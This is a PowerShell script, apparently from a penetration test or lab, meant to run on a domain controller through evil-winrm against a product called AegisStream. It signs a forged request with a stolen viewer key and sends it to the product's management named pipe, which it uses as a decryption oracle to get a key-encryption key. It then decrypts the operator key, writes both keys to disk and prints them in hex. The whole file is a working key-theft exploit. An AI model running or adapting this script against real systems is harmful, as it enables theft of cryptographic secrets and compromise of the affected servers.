# oracle + decrypt + config_import test - run on DC via evil-winrm
$ErrorActionPreference = 'Continue'
$viewerKey = [IO.File]::ReadAllBytes('C:/ProgramData/AegisStream/keys/viewer.key')
$wrapBlob = [IO.File]::ReadAllBytes('C:/ProgramData/AegisStream/dpapi/operator.wrap.bin')
$encBlob = [IO.File]::ReadAllBytes('C:/ProgramData/AegisStream/keys/operator.key.enc')
$opBytes = [Text.Encoding]::UTF8.GetBytes('DIAG_DECRYPT_TELEMETRY_BLOB')
$hmac = New-Object System.Security.Cryptography.HMACSHA256(,$viewerKey)
$signData = New-Object byte[] ($opBytes.Length + $wrapBlob.Length)
[Array]::Copy($opBytes, 0, $signData, 0, $opBytes.Length)
[Array]::Copy($wrapBlob, 0, $signData, $opBytes.Length, $wrapBlob.Length)
$sig = $hmac.ComputeHash($signData)
$ms = New-Object IO.MemoryStream
$bw = New-Object IO.BinaryWriter($ms)
$bw.Write([byte[]]@(0xAB, 0x5E, 0x91, 0xA3))
$bw.Write([int32]1)
$bw.Write([int16]$opBytes.Length); $bw.Write($opBytes)
$bw.Write([int32]$wrapBlob.Length); $bw.Write($wrapBlob)
$bw.Write($sig); $bw.Flush()
$pipe = New-Object System.IO.Pipes.NamedPipeClientStream('.','AegisStreamMgmt',[System.IO.Pipes.PipeDirection]::InOut,[System.IO.Pipes.PipeOptions]::None,[System.Security.Principal.TokenImpersonationLevel]::Identification)
$pipe.Connect(5000)
$pipe.Write($ms.ToArray(), 0, $ms.Length); $pipe.Flush()
$buf = New-Object byte[] 131072
$n = $pipe.Read($buf, 0, 131072); $pipe.Dispose()
$rOpLen = [BitConverter]::ToUInt16($buf, 8)
$rOpCode = [Text.Encoding]::UTF8.GetString($buf, 10, $rOpLen)
$rPlLen = [BitConverter]::ToInt32($buf, 10 + $rOpLen)
$kek = New-Object byte[] $rPlLen
[Array]::Copy($buf, 10 + $rOpLen + 4, $kek, 0, $rPlLen)
[IO.File]::WriteAllBytes('C:/Users/svc-aegis-deploy/Documents/kek.bin', $kek)
$kekHex = ([BitConverter]::ToString($kek)).Replace('-','').ToLower()
Write-Output "ORACLE $rOpCode kek=$kekHex"

# AES-GCM decrypt operator.key.enc with kek (nonce12|tag16|ct)
$nonce = $encBlob[0..11]
$tag = $encBlob[12..27]
$ct = $encBlob[28..($encBlob.Length-1)]
$aes = [System.Security.Cryptography.AesGcm]::new($kek, 16)
$pt = New-Object byte[] $ct.Length
$aes.Decrypt($nonce, $ct, $tag, $pt)
$opKeyHex = ([BitConverter]::ToString($pt)).Replace('-','').ToLower()
[IO.File]::WriteAllBytes('C:/Users/svc-aegis-deploy/Documents/opkey.bin', $pt)
Write-Output "OPKEY $opKeyHex"
